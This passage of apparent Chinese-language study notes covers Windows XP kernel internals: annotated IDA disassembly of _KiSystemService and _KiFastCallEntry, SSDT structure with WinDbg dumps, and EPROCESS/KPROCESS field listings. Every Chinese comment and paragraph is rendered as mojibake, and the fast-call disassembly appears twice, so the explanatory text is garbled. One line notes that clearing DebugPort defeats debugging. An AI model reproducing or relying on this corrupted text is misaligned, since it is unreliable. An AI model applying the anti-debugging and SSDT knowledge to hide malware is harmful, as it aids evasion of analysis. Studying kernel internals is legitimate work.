å°±æ˜¯0x6cçš„ä½ç½®ï¼Œæ˜¯ä¹‹å‰CSçš„å€¼ .text:00407663 and ebx, 1 ; 0ç¯æœ€ä½ä½ä¸º0ï¼Œ3ç¯æœ€ä½ä½ä¸º1 .text:00407666 mov [esi+140h], bl ; å­˜å…¥æ–°çš„\"å…ˆå‰æ¨¡å¼\" .text:0040766C mov ebp, esp ; å°†ebpä¹Ÿæ”¹ä¸ºæŒ‡å‘å›¾ä¸­0x00çš„ä½ç½® .text:0040766E mov ebx, [esi+134h] ; ebxæŒ‡å‘_KTHREAD[0x134] =\u003e TrapFrame .text:00407674 mov [ebp+3Ch], ebx ; å°†TrapFrameä¸´æ—¶å­˜åœ¨edxï¼ˆ_Trap_Frame[0x3c] =\u003e edxï¼‰ä¸­ .text:00407677 mov [esi+134h], ebp ; å°†æ–°çš„TrapFrameå†™å› .text:0040767D cld ; Clear Direction Flag .text:0040767E mov ebx, [ebp+60h] ; ebx = ebpï¼ˆä¸‰ç¯ï¼‰ .text:00407681 mov edi, [ebp+68h] ; edi = eipï¼ˆä¸‰ç¯ï¼‰ .text:00407684 mov [ebp+0Ch], edx .text:00407687 mov dword ptr [ebp+8], 0BADB0D00h ; å­˜å…¥æ ‡å¿— .text:0040768E mov [ebp+0], ebx ; å­˜å…¥è°ƒè¯•ebp .text:00407691 mov [ebp+4], edi ; å­˜å…¥è°ƒè¯•eip .text:00407694 test byte ptr [esi+2Ch], 0FFh ; åˆ¤æ–­æ˜¯å¦æ˜¯è°ƒè¯•çŠ¶æ€ï¼ˆDebugActive == -1ï¼‰ .text:00407698 jnz Dr_kss_a ; æ˜¯ï¼Œè·³è¿‡å»çš„æµç¨‹ä¸»è¦æ˜¯å°†è°ƒè¯•å¯„å­˜å™¨dr0~dr7èµ‹å€¼ï¼ˆ0x18~0x2cï¼‰ .text:0040769E .text:0040769E loc_40769E: ; CODE XREF: Dr_kss_a+10â†‘j .text:0040769E ; Dr_kss_a+7Câ†‘j .text:0040769E sti ; Set Interrupt Flag .text:0040769F jmp loc_407781 ; _KiFastCallEntryçš„åé¢ .text:0040769F _KiSystemService endp _KiFastCallEntry\n.text:004076F0 _KiFastCallEntry proc near ; DATA XREF: _KiTrap01+6Fâ†“o .text:004076F0 ; KiLoadFastSyscallMachineSpecificRegisters(x)+24â†“o .text:004076F0 .text:004076F0 var_B = byte ptr -0Bh .text:004076F0 .text:004076F0 ; FUNCTION CHUNK AT .text:004076C8 SIZE 00000023 BYTES .text:004076F0 ; FUNCTION CHUNK AT .text:00407990 SIZE 00000014 BYTES .text:004076F0 .text:004076F0 mov ecx, 23h ; '#' .text:004076F5 push 30h ; '0' .text:004076F7 pop fs ; ä¸€æ ·å°†fsç½®ä¸º0x30 .text:004076F9 mov ds, ecx .text:004076FB mov es, ecx ; å°†dså’Œeséƒ½ç½®ä¸º0x23 .text:004076FD mov ecx, ds:0FFDFF040h ; å°†ecxç½®ä¸º_KPCR[0x40] =\u003e TSS .text:00407703 mov esp, [ecx+4] ; å°†espç½®ä¸ºTSS[0x4] =\u003e esp0 .text:00407706 push 23h ; '#' ; å­˜å…¥0x23ä½œä¸ºssï¼ˆä¸‰ç¯ï¼‰ .text:00407708 push edx ; å­˜å…¥edxä½œä¸ºespï¼ˆä¸‰ç¯ï¼‰ .text:00407709 pushf ; Push Flags Register onto the Stack .text:0040770A .text:0040770A loc_40770A: ; CODE XREF: _KiFastCallEntry2+22â†‘j .text:0040770A push 2 ; å­˜å…¥csï¼ˆä¸‰ç¯ï¼‰ .text:0040770C add edx, 8 ; Add .text:0040770F popf ; eflag = 2 .text:00407710 or [esp+0Ch+var_B], 2 ; è®¾ç½®å­˜å…¥çš„eflagçš„ç¬¬äºŒä¸ªä½ .text:00407715 push 1Bh ; cs = 0x1b .text:00407717 push dword ptr ds:0FFDF0304h .text:0040771D push 0 ; ErrCode = 0 .text:0040771F push ebp .text:00407720 push ebx .text:00407721 push esi .text:00407722 push edi ; å¯¹åº”å­˜å…¥ç›´åˆ°å›¾ä¸­çš„0x54 .text:00407723 mov ebx, ds:0FFDFF01Ch ; ebx = _KPCR.SelfPcrï¼ˆå°±æ˜¯_KPCRè‡ªå·±çš„èµ·å§‹åœ°å€ï¼‰ .text:00407729 push 3Bh ; ';' ; fs = 0x3b .text:0040772B mov esi, [ebx+124h] ; esi = _KPCRB.CurrentThread .text:00407731 push dword ptr [ebx] ; ä¿å­˜æ—§ExceptionList .text:00407733 mov dword ptr [ebx], -1 ; å°†æ–°çš„ExceptionListç½®ä¸º-1 .text:00407739 mov ebp, [esi+18h] ; ebp = _KTHREAD.InitialStack .text:0040773C push 1 ; å°†å…ˆå‰æ¨¡å¼ä½ç½®ä¸º1 .text:0040773E sub esp, 48h ; espæŒ‡å‘TrapFrameå¼€å§‹ä½ç½® .text:00407741 sub ebp, 29Ch ; Integer Subtraction .text:00407747 mov byte ptr [esi+140h], 1 ; å°†å…ˆå‰æ¨¡å¼ç½®ä¸º1 .text:0040774E cmp ebp, esp ; Compare Two Operands .text:00407750 jnz loc_4076C8 ; Jump if Not Zero (ZF=0) .text:00407756 and dword ptr [ebp+2Ch], 0 ; Logical AND .text:0040775A test byte ptr [esi+2Ch], 0FFh ; DebugActive == -1 ï¼Ÿ .text:0040775E mov [esi+134h], ebp ; æ›¿æ¢TrapFrame .text:00407764 jnz Dr_FastCallDrSave ; æ˜¯ï¼Œè·³è¿‡å»çš„æµç¨‹ä¸»è¦æ˜¯å°†è°ƒè¯•å¯„å­˜å™¨dr0~dr7èµ‹å€¼ .text:0040776A .text:0040776A loc_40776A: ; CODE XREF: Dr_FastCallDrSave+10â†‘j .text:0040776A ; Dr_FastCallDrSave+7Câ†‘j .text:0040776A mov ebx, [ebp+60h] ; ebx = TrapFrame.Ebp .text:0040776D mov edi, [ebp+68h] ; edi = TrapFrame.Eip .text:00407770 mov [ebp+0Ch], edx .text:00407773 mov dword ptr [ebp+8], 0BADB0D00h .text:0040777A mov [ebp+0], ebx .text:0040777D mov [ebp+4], edi ; èµ‹å€¼è°ƒè¯•çš„å¯„å­˜å™¨0x00~0xc .text:00407780 sti ; Set Interrupt Flag SystemServiceTableï¼ˆç³»ç»ŸæœåŠ¡è¡¨ï¼‰ å¦‚ä½•æ ¹æ®ç³»ç»ŸæœåŠ¡å·ï¼ˆeaxä¸­å­˜å‚¨ï¼‰æ‰¾åˆ°è¦æ‰§è¡Œçš„å†…æ ¸å‡½æ•°ï¼Ÿè°ƒç”¨æ—¶å‚æ•°æ˜¯å­˜å‚¨åˆ°3ç¯çš„å †æ ˆï¼Œå¦‚ä½•ä¼ é€’ç»™å†…æ ¸å‡½æ•°ï¼Ÿ\nç»“æ„å¦‚ä¸‹ï¼š\nServiceTableï¼šå­˜å‚¨äº†ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å‡½æ•°åœ°å€è¡¨ï¼ˆå­˜å‚¨å‡½æ•°çš„åœ°å€ï¼Œ4å­—èŠ‚ï¼‰ã€‚ Countï¼š å½“å‰ç³»ç»ŸæœåŠ¡è¡¨è°ƒç”¨äº†å¤šå°‘æ¬¡ã€‚ ServiceLimitï¼šç³»ç»ŸæœåŠ¡è¡¨ä¸­ä¸€å…±æœ‰å¤šå°‘ä¸ªå‡½æ•°ã€‚ ArgmentTableï¼šå­˜å‚¨äº†ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å‡½æ•°å‚æ•°è¡¨ï¼ˆå‡½æ•°æœ‰å‡ ä¸ªå­—èŠ‚å‚æ•°ï¼Œ1å­—èŠ‚ï¼‰ã€‚ å›¾ä¸Šä¸¤ä¸ªé¢œè‰²æ˜¯å› ä¸ºä¸€ä¸ªæ˜¯Ntoskrl.exeå¯¼å‡ºçš„å‡½æ•°ï¼Œä¸€ä¸ªæ˜¯Win32k.syså¯¼å‡ºçš„å‡½æ•°ã€‚å¯ä»¥é€šè¿‡_KTHREAD[0xe0]æ‰¾åˆ°ã€‚\nå¦‚ä½•ä½¿ç”¨ï¼š\nå…ˆçœ‹ç¬¬12ä½æ˜¯0è¿˜æ˜¯1ï¼Œ0åˆ™ç”¨Ntoskrl.exeæ¨¡å—æŸ¥ï¼Œå¦åˆ™ç”¨Win32k.sysæ¨¡å—æŸ¥ã€‚ åé¢çš„ç¬¬12ä½åˆ™æ˜¯å¯¹åº”å‡½æ•°åœ°å€è¡¨ä¸å‡½æ•°å‚æ•°è¡¨çš„ç´¢å¼•ï¼ˆä¸¤ä¸ªç´¢å¼•ç›¸åŒï¼‰ã€‚ _KiFastCallEntryï¼š\n.text:004076F0 _KiFastCallEntry proc near ; DATA XREF: _KiTrap01+6Fâ†“o .text:004076F0 ; KiLoadFastSyscallMachineSpecificRegisters(x)+24â†“o .text:004076F0 .text:004076F0 var_B = byte ptr -0Bh .text:004076F0 .text:004076F0 ; FUNCTION CHUNK AT .text:004076C8 SIZE 00000023 BYTES .text:004076F0 ; FUNCTION CHUNK AT .text:00407990 SIZE 00000014 BYTES .text:004076F0 .text:004076F0 mov ecx, 23h ; '#' .text:004076F5 push 30h ; '0' .text:004076F7 pop fs ; ä¸€æ ·å°†fsç½®ä¸º0x30 .text:004076F9 mov ds, ecx .text:004076FB mov es, ecx ; å°†dså’Œeséƒ½ç½®ä¸º0x23 .text:004076FD mov ecx, ds:0FFDFF040h ; å°†ecxç½®ä¸º_KPCR[0x40] =\u003e TSS .text:00407703 mov esp, [ecx+4] ; å°†espç½®ä¸ºTSS[0x4] =\u003e esp0 .text:00407706 push 23h ; '#' ; å­˜å…¥0x23ä½œä¸ºssï¼ˆä¸‰ç¯ï¼‰ .text:00407708 push edx ; å­˜å…¥edxä½œä¸ºespï¼ˆä¸‰ç¯ï¼‰ .text:00407709 pushf .text:0040770A .text:0040770A loc_40770A: ; CODE XREF: _KiFastCallEntry2+22â†‘j .text:0040770A push 2 ; å­˜å…¥csï¼ˆä¸‰ç¯ï¼‰ .text:0040770C add edx, 8 .text:0040770F popf ; eflag = 2 .text:00407710 or [esp+0Ch+var_B], 2 ; è®¾ç½®å­˜å…¥çš„eflagçš„ç¬¬äºŒä¸ªä½ .text:00407715 push 1Bh ; cs = 0x1b .text:00407717 push dword ptr ds:0FFDF0304h .text:0040771D push 0 ; ErrCode = 0 .text:0040771F push ebp .text:00407720 push ebx .text:00407721 push esi .text:00407722 push edi ; å¯¹åº”å­˜å…¥ç›´åˆ°å›¾ä¸­çš„0x54 .text:00407723 mov ebx, ds:0FFDFF01Ch ; ebx = _KPCR.SelfPcrï¼ˆå°±æ˜¯_KPCRè‡ªå·±çš„èµ·å§‹åœ°å€ï¼‰ .text:00407729 push 3Bh ; ';' ; fs = 0x3b .text:0040772B mov esi, [ebx+124h] ; esi = _KPCRB.CurrentThread .text:00407731 push dword ptr [ebx] ; ä¿å­˜æ—§ExceptionList .text:00407733 mov dword ptr [ebx], -1 ; å°†æ–°çš„ExceptionListç½®ä¸º-1 .text:00407739 mov ebp, [esi+18h] ; ebp = _KTHREAD.InitialStack .text:0040773C push 1 ; å°†å…ˆå‰æ¨¡å¼ä½ç½®ä¸º1 .text:0040773E sub esp, 48h ; espæŒ‡å‘TrapFrameå¼€å§‹ä½ç½® .text:00407741 sub ebp, 29Ch .text:00407747 mov byte ptr [esi+140h], 1 ; å°†å…ˆå‰æ¨¡å¼ç½®ä¸º1 .text:0040774E cmp ebp, esp .text:00407750 jnz loc_4076C8 .text:00407756 and dword ptr [ebp+2Ch], 0 .text:0040775A test byte ptr [esi+2Ch], 0FFh ; DebugActive == -1 ï¼Ÿ .text:0040775E mov [esi+134h], ebp ; æ›¿æ¢TrapFrame .text:00407764 jnz Dr_FastCallDrSave ; æ˜¯ï¼Œè·³è¿‡å»çš„æµç¨‹ä¸»è¦æ˜¯å°†è°ƒè¯•å¯„å­˜å™¨dr0~dr7èµ‹å€¼ .text:0040776A .text:0040776A loc_40776A: ; CODE XREF: Dr_FastCallDrSave+10â†‘j .text:0040776A ; Dr_FastCallDrSave+7Câ†‘j .text:0040776A mov ebx, [ebp+60h] ; ebx = TrapFrame.Ebp .text:0040776D mov edi, [ebp+68h] ; edi = TrapFrame.Eip .text:00407770 mov [ebp+0Ch], edx .text:00407773 mov dword ptr [ebp+8], 0BADB0D00h .text:0040777A mov [ebp+0], ebx .text:0040777D mov [ebp+4], edi ; èµ‹å€¼è°ƒè¯•çš„å¯„å­˜å™¨0x00~0xc .text:00407780 sti .text:00407781 .text:00407781 loc_407781: ; CODE XREF: _KiBBTUnexpectedRange+18â†‘j .text:00407781 ; _KiSystemService+6Eâ†‘j .text:00407781 mov edi, eax ; å–æœåŠ¡å·èµ‹å€¼ç»™edi .text:00407783 shr edi, 8 ; å³ç§»8ä½ .text:00407786 and edi, 110000b ; å–ç¬¬13å’Œ12ä½ï¼ˆä»0å¼€å§‹ï¼‰ï¼Œå¦‚æœç¬¬12ä½ä¸º1ï¼Œediæ‰æ˜¯0x10ï¼ˆ01 0000ï¼‰ï¼Œå¦åˆ™æ˜¯00ï¼ˆ00 0000ï¼‰ .text:00407786 ; é€šè¿‡è¿™ä¸ªåç§»å¯ä»¥å®ç°ä½¿ç”¨çš„æ˜¯å“ªå¼ æœåŠ¡è¡¨ï¼ˆä¸€ä¸ªæœåŠ¡è¡¨4*4=0x10ï¼‰ .text:00407789 mov ecx, edi ; ecx = edi .text:0040778B add edi, [esi+0E0h] ; edi = _KTHREAD.ServiceTable .text:00407791 mov ebx, eax ; eax = ebx .text:00407793 and eax, 111111111111b ; åªè¦ç³»ç»Ÿè°ƒç”¨å·çš„å12ä½ .text:00407798 cmp eax, [edi+8] ; æ¯”è¾ƒè¿™ä¸ªæœåŠ¡å·æ˜¯å¦åœ¨_SYSTEM_SERVICE_TABLE.ServiceLimitï¼ˆæœ‰å¤šå°‘ä¸ªå‡½æ•°ï¼‰ä¸­ .text:0040779B jnb _KiBBTUnexpectedRange .text:004077A1 cmp ecx, 10000b ; æ¯”è¾ƒä¹‹å‰çš„é‚£ä¸ªç¬¬12ä½æ˜¯å¦æ˜¯1 .text:004077A4 jnz short loc_4077C0 ; æŸ¥æ‰¾ç¬¬ä¸€ä¸ªç³»ç»ŸæœåŠ¡è¡¨ .text:004077A6 mov ecx, ds:0FFDFF018h .text:004077AC xor ebx, ebx .text:004077AE .text:004077AE loc_4077AE: ; DATA XREF: _KiTrap0E+110â†“o .text:004077AE or ebx, [ecx+0F70h] .text:004077B4 jz short loc_4077C0 .text:004077B6 push edx .text:004077B7 push eax .text:004077B8 call ds:_KeGdiFlushUserBatch .text:004077BE pop eax .text:004077BF pop edx .text:004077C0 .text:004077C0 loc_4077C0: ; CODE XREF: _KiFastCallEntry+B4â†‘j .text:004077C0 ; _KiFastCallEntry+C4â†‘j .text:004077C0 inc dword ptr ds:0FFDFF638h .text:004077C6 mov esi, edx ; esi = edxï¼ˆä¸‰ç¯å‚æ•°çš„æŒ‡é’ˆï¼ˆlea edx, [esp+arg_4]ï¼‰ï¼‰ .text:004077C8 mov ebx, [edi+0Ch] ; ebx = _SYSTEM_SERVICE_TABLE.ArgmentTable .text:004077CB xor ecx, ecx ; æ¸…ç©ºecx .text:004077CD mov cl, [eax+ebx] ; cl = è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„å‚æ•°çš„å­—èŠ‚å¤§å° .text:004077D0 mov edi, [edi] ; edi = _SYSTEM_SERVICE_TABLE.ServiecTableï¼ˆå‡½æ•°åœ°å€è¡¨ï¼‰ .text:004077D2 mov ebx, [edi+eax*4] ; ebx = 0ç¯å‡½æ•°çš„åœ°å€ .text:004077D5 sub esp, ecx ; æå‡å¯¹åº”çš„å‚æ•°ä¸ªæ•°ä¸ªå †æ ˆï¼ˆè¿™é‡Œçš„ecxæ˜¯è¦æ‰§è¡Œçš„å‚æ•°çš„å­—èŠ‚å¤§å°ï¼‰ .text:004077D7 shr ecx, 2 ; å‚æ•°é•¿åº¦/4 = å‚æ•°ä¸ªæ•°ï¼ˆå››å­—èŠ‚ï¼‰ï¼Œä¸€æ¬¡æ‹·è´4å­—èŠ‚ï¼Œè¿™æ˜¯æ‹·è´çš„æ¬¡æ•° .text:004077DA mov edi, esp ; ediæŒ‡å‘å‡½æ•°å‚æ•°çš„ä½ç½® .text:004077DC cmp esi, ds:_MmUserProbeAddress .text:004077E2 jnb loc_407990 .text:004077E8 .text:004077E8 loc_4077E8: ; CODE XREF: _KiFastCallEntry+2A4â†“j .text:004077E8 ; DATA XREF: _KiTrap0E+106â†“o .text:004077E8 rep movsd ; å¾ªç¯æ‹·è´ .text:004077EA call ebx SSDT é™¤äº†å¯ä»¥ç”¨_KTHREAD[0xe0]å¯ä»¥è®¿é—®ï¼Œè¿˜å¯ä»¥ä½¿ç”¨SSDTè®¿é—®ï¼ˆSystem Services Descriptor Tableï¼Œç³»ç»ŸæœåŠ¡æè¿°è¡¨ï¼‰ã€‚å®ƒæ˜¯ntoskrnl.exeå¯¼å‡ºçš„ä¸€ä¸ªå…¨å±€å˜é‡\næŸ¥çœ‹ï¼š\nkd\u003e dd KeServiceDescriptorTable 80553fa0 80502b8c 00000000 0000011c 80503000 80553fb0 00000000 00000000 00000000 00000000 80553fc0 00000000 00000000 00000000 00000000 80553fd0 00000000 00000000 00000000 00000000 SSDTçš„æ¯ä¸€ä¸ªæˆå‘˜éƒ½æ˜¯ç³»ç»ŸæœåŠ¡è¡¨ï¼Œä¸€å…±æœ‰å››ä¸ªæˆå‘˜ï¼ˆä¹Ÿå°±æ˜¯å››ä¸ªç³»ç»ŸæœåŠ¡è¡¨ï¼Œä½†åä¸¤ä¸ªæœªä½¿ç”¨ï¼‰ã€‚é€šè¿‡ä¸Šé¢çš„æŒ‡ä»¤æˆ‘ä»¬åªèƒ½çœ‹åˆ°ä¸€å¼ è¡¨ï¼ˆntoskrnl.exeçš„ï¼‰\næŸ¥çœ‹å®Œæ•´çš„SSDTï¼š\nkd\u003e dd KeServiceDescriptorTableShadow 80553f60 80502b8c 00000000 0000011c 80503000 80553f70 bf999b80 00000000 0000029b bf99a890 80553f80 00000000 00000000 00000000 00000000 80553f90 00000000 00000000 00000000 00000000 SSDT Shadowæ˜¯æœªå¯¼å‡ºçš„ï¼Œæ‰€ä»¥è¦é€šè¿‡å…¶ä»–çš„æ–¹æ³•è·å–ã€‚\nç¬¬ä¸€ä¸ªæˆå‘˜ï¼ˆ80502b8cï¼‰ï¼šå‡½æ•°åœ°å€è¡¨ ç¬¬äºŒä¸ªæˆå‘˜ï¼ˆ00000000ï¼‰ï¼šè¿™ä¸ªæœåŠ¡è¡¨è¢«è®¿é—®äº†å¤šå°‘æ¬¡ ç¬¬ä¸‰ä¸ªæˆå‘˜ï¼ˆ0000011cï¼‰ï¼šè¿™ä¸ªæœåŠ¡è¡¨ä¸€å…±æœ‰å¤šå°‘ä¸ªå‡½æ•° ç¬¬å››ä¸ªå‡½æ•°ï¼ˆ80503000ï¼‰ï¼šå‡½æ•°å‚æ•°è¡¨ è¿›ç¨‹ä¸çº¿ç¨‹ è¿›ç¨‹ç»“æ„ä½“ EPROCESS\næ¯ä¸ªwindowsè¿›ç¨‹åœ¨0ç¯éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ç»“æ„ä½“ï¼ˆEPROCESSï¼‰ï¼Œè¿™ä¸ªç»“æ„ä½“åŒ…å«äº†è¿›ç¨‹æ‰€æœ‰é‡è¦çš„ä¿¡æ¯ã€‚\nkd\u003e dt _EPROCESS ntdll!_EPROCESS +0x000 Pcb : _KPROCESS +0x06c ProcessLock : _EX_PUSH_LOCK +0x070 CreateTime : _LARGE_INTEGER +0x078 ExitTime : _LARGE_INTEGER +0x080 RundownProtect : _EX_RUNDOWN_REF +0x084 UniqueProcessId : Ptr32 Void +0x088 ActiveProcessLinks : _LIST_ENTRY +0x090 QuotaUsage : [3] Uint4B +0x09c QuotaPeak : [3] Uint4B +0x0a8 CommitCharge : Uint4B +0x0ac PeakVirtualSize : Uint4B +0x0b0 VirtualSize : Uint4B +0x0b4 SessionProcessLinks : _LIST_ENTRY +0x0bc DebugPort : Ptr32 Void +0x0c0 ExceptionPort : Ptr32 Void +0x0c4 ObjectTable : Ptr32 _HANDLE_TABLE +0x0c8 Token : _EX_FAST_REF +0x0cc WorkingSetLock : _FAST_MUTEX +0x0ec WorkingSetPage : Uint4B +0x0f0 AddressCreationLock : _FAST_MUTEX +0x110 HyperSpaceLock : Uint4B +0x114 ForkInProgress : Ptr32 _ETHREAD +0x118 HardwareTrigger : Uint4B +0x11c VadRoot : Ptr32 Void +0x120 VadHint : Ptr32 Void +0x124 CloneRoot : Ptr32 Void +0x128 NumberOfPrivatePages : Uint4B +0x12c NumberOfLockedPages : Uint4B +0x130 Win32Process : Ptr32 Void +0x134 Job : Ptr32 _EJOB +0x138 SectionObject : Ptr32 Void +0x13c SectionBaseAddress : Ptr32 Void +0x140 QuotaBlock : Ptr32 _EPROCESS_QUOTA_BLOCK +0x144 WorkingSetWatch : Ptr32 _PAGEFAULT_HISTORY +0x148 Win32WindowStation : Ptr32 Void +0x14c InheritedFromUniqueProcessId : Ptr32 Void +0x150 LdtInformation : Ptr32 Void +0x154 VadFreeHint : Ptr32 Void +0x158 VdmObjects : Ptr32 Void +0x15c DeviceMap : Ptr32 Void +0x160 PhysicalVadList : _LIST_ENTRY +0x168 PageDirectoryPte : _HARDWARE_PTE_X86 +0x168 Filler : Uint8B +0x170 Session : Ptr32 Void +0x174 ImageFileName : [16] UChar +0x184 JobLinks : _LIST_ENTRY +0x18c LockedPagesList : Ptr32 Void +0x190 ThreadListHead : _LIST_ENTRY +0x198 SecurityPort : Ptr32 Void +0x19c PaeTop : Ptr32 Void +0x1a0 ActiveThreads : Uint4B +0x1a4 GrantedAccess : Uint4B +0x1a8 DefaultHardErrorProcessing : Uint4B +0x1ac LastThreadExitStatus : Int4B +0x1b0 Peb : Ptr32 _PEB +0x1b4 PrefetchTrace : _EX_FAST_REF +0x1b8 ReadOperationCount : _LARGE_INTEGER +0x1c0 WriteOperationCount : _LARGE_INTEGER +0x1c8 OtherOperationCount : _LARGE_INTEGER +0x1d0 ReadTransferCount : _LARGE_INTEGER +0x1d8 WriteTransferCount : _LARGE_INTEGER +0x1e0 OtherTransferCount : _LARGE_INTEGER +0x1e8 CommitChargeLimit : Uint4B +0x1ec CommitChargePeak : Uint4B +0x1f0 AweInfo : Ptr32 Void +0x1f4 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO +0x1f8 Vm : _MMSUPPORT +0x238 LastFaultCount : Uint4B +0x23c ModifiedPageCount : Uint4B +0x240 NumberOfVads : Uint4B +0x244 JobStatus : Uint4B +0x248 Flags : Uint4B +0x248 CreateReported : Pos 0, 1 Bit +0x248 NoDebugInherit : Pos 1, 1 Bit +0x248 ProcessExiting : Pos 2, 1 Bit +0x248 ProcessDelete : Pos 3, 1 Bit +0x248 Wow64SplitPages : Pos 4, 1 Bit +0x248 VmDeleted : Pos 5, 1 Bit +0x248 OutswapEnabled : Pos 6, 1 Bit +0x248 Outswapped : Pos 7, 1 Bit +0x248 ForkFailed : Pos 8, 1 Bit +0x248 HasPhysicalVad : Pos 9, 1 Bit +0x248 AddressSpaceInitialized : Pos 10, 2 Bits +0x248 SetTimerResolution : Pos 12, 1 Bit +0x248 BreakOnTermination : Pos 13, 1 Bit +0x248 SessionCreationUnderway : Pos 14, 1 Bit +0x248 WriteWatch : Pos 15, 1 Bit +0x248 ProcessInSession : Pos 16, 1 Bit +0x248 OverrideAddressSpace : Pos 17, 1 Bit +0x248 HasAddressSpace : Pos 18, 1 Bit +0x248 LaunchPrefetched : Pos 19, 1 Bit +0x248 InjectInpageErrors : Pos 20, 1 Bit +0x248 VmTopDown : Pos 21, 1 Bit +0x248 Unused3 : Pos 22, 1 Bit +0x248 Unused4 : Pos 23, 1 Bit +0x248 VdmAllowed : Pos 24, 1 Bit +0x248 Unused : Pos 25, 5 Bits +0x248 Unused1 : Pos 30, 1 Bit +0x248 Unused2 : Pos 31, 1 Bit +0x24c ExitStatus : Int4B +0x250 NextPageColor : Uint2B +0x252 SubSystemMinorVersion : UChar +0x253 SubSystemMajorVersion : UChar +0x252 SubSystemVersion : Uint2B +0x254 PriorityClass : UChar +0x255 WorkingSetAcquiredUnsafe : UChar +0x258 Cookie : Uint4B ç¬¬ä¸€ä¸ªå­æˆå‘˜ä¸ºKPROCESSï¼š\nkd\u003e dt _KPROCESS ntdll!_KPROCESS +0x000 Header : _DISPATCHER_HEADER +0x010 ProfileListHead : _LIST_ENTRY +0x018 DirectoryTableBase : [2] Uint4B +0x020 LdtDescriptor : _KGDTENTRY +0x028 Int21Descriptor : _KIDTENTRY +0x030 IopmOffset : Uint2B +0x032 Iopl : UChar +0x033 Unused : UChar +0x034 ActiveProcessors : Uint4B +0x038 KernelTime : Uint4B +0x03c UserTime : Uint4B +0x040 ReadyListHead : _LIST_ENTRY +0x048 SwapListEntry : _SINGLE_LIST_ENTRY +0x04c VdmTrapcHandler : Ptr32 Void +0x050 ThreadListHead : _LIST_ENTRY +0x058 ProcessLock : Uint4B +0x05c Affinity : Uint4B +0x060 StackCount : Uint2B +0x062 BasePriority : Char +0x063 ThreadQuantum : Char +0x064 AutoAlignment : UChar +0x065 State : UChar +0x066 ThreadSeed : UChar +0x067 DisableBoost : UChar +0x068 PowerState : UChar +0x069 DisableQuantum : UChar +0x06a IdealNode : UChar +0x06b Flags : _KEXECUTE_OPTIONS +0x06b ExecuteOptions : UChar KPROCESSä¸­ä¸€äº›é‡è¦çš„æˆå‘˜ï¼š\nHeader\nKPROCESSçš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œä»¥å®ƒå¼€å¤´çš„å†…æ ¸å¯¹è±¡å¯ä»¥è¢«WaitForSingleObjectå‡½æ•°æ‰€ç­‰å¾…ï¼ˆæ¯”å¦‚Mutexäº’æ–¥ä½“ï¼ŒEventäº‹ä»¶ç­‰ï¼‰\nDirectoryTableBase\nKPROCESS[0x18]ï¼Œä¸ºé¡µç›®å½•è¡¨åŸºå€ã€‚\nKernelTime | UserTime\nKPROCESS[0x38~0x3c]ï¼Œåœ¨0ç¯å’Œåœ¨3ç¯çš„è¿è¡Œæ—¶é—´ã€‚\nAffinity\nKPROCESS[0x5c]ï¼Œè§„å®šè¿›ç¨‹é‡Œé¢çš„æ‰€æœ‰çº¿ç¨‹èƒ½åœ¨å“ªä¸ªCPUä¸Šè·‘ã€‚\nå¦‚æœä¸º1ï¼ˆ00000001ï¼‰ï¼Œåªèƒ½åœ¨0å·CPUä¸Šè·‘ã€‚\nå¦‚æœä¸º3ï¼ˆ00000011ï¼‰ï¼Œåªèƒ½åœ¨0ã€1å·CPUä¸Šè·‘ã€‚\nå¦‚æœä¸º5ï¼ˆ00000101ï¼‰ï¼Œåªèƒ½åœ¨0ã€2å·CPUä¸Šè·‘ã€‚\n32ä½ä¸‹è¿™ä¸ªæˆå‘˜ä¸º4å­—èŠ‚ï¼Œå…±32ä½ï¼Œ32ä¸ªæ ¸ï¼›64ä½ä¸‹è¿™ä¸ªæˆå‘˜ä¸º8å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯64ä¸ªæ ¸ã€‚\nBasePriority\nKPROCESS[0x62]ï¼ŒåŸºç¡€ä¼˜å…ˆçº§æˆ–æœ€ä½ä¼˜å…ˆçº§ï¼Œè¯¥è¿›ç¨‹ä¸­æœ€èµ·å§‹åˆ›å»ºçš„ä¼˜å…ˆçº§ã€‚\nEPROCESSä¸­ä¸€äº›é‡è¦çš„æˆå‘˜ï¼š\nCreateTime | ExitTime\nEPROCESS[0x70~0x78]ï¼Œè¿›ç¨‹ä½•æ—¶åˆ›å»ºçš„å’Œä½•æ—¶é€€å‡ºçš„ã€‚\nUniqueProcessId\nEPROCESS[0x84]ï¼Œè¿›ç¨‹çš„PIDã€‚\nActiveProcessLinks\nEPROCESS[0x88]ï¼Œæ‰€æœ‰çš„æ´»åŠ¨è¿›ç¨‹éƒ½è¿æ¥åœ¨ä¸€èµ·ï¼Œæ„æˆçš„åŒå‘é“¾è¡¨ã€‚å…¨å±€å˜é‡PsActiveProcessHeadæŒ‡å‘è¿™ä¸ªå…¨å±€é“¾çš„è¡¨å¤´ã€‚\nQuotaUsage | QuotaPeak\nEPROCESS[0x90~0x9c]ï¼Œç‰©ç†é¡µç›¸å…³çš„ç»Ÿè®¡ä¿¡æ¯ã€‚\nCommitCharge | PeakVirtualSize | VirtualSize\nEPROCESS[0xa8~0xb0]ï¼Œè™šæ‹Ÿå†…å­˜ç›¸å…³çš„ç»Ÿè®¡ä¿¡æ¯ã€‚\nVadRoot\nEPROCESS[0x11c]ï¼Œè¿›ç¨‹çš„çº¿æ€§åœ°å€çš„ä½¿ç”¨æƒ…å†µå’Œè®°å½•ï¼ˆ0~2Gå“ªäº›åœ°å€æ²¡æœ‰å ç”¨ï¼‰ã€‚\nDebugPort | ExceptionPort\nEPROCESS[0xbc~0xc0]ï¼Œè°ƒè¯•ç›¸å…³ï¼ŒDebugPortæ¸…é›¶å®ç°åè°ƒè¯•ã€‚\nObjectTable\nEPROCESS[0xc4]ï¼Œå¥æŸ„è¡¨ï¼Œä¼šå­˜å‚¨è¿™ä¸ªè¿›ç¨‹ä¸­æ‰€æœ‰å†…æ 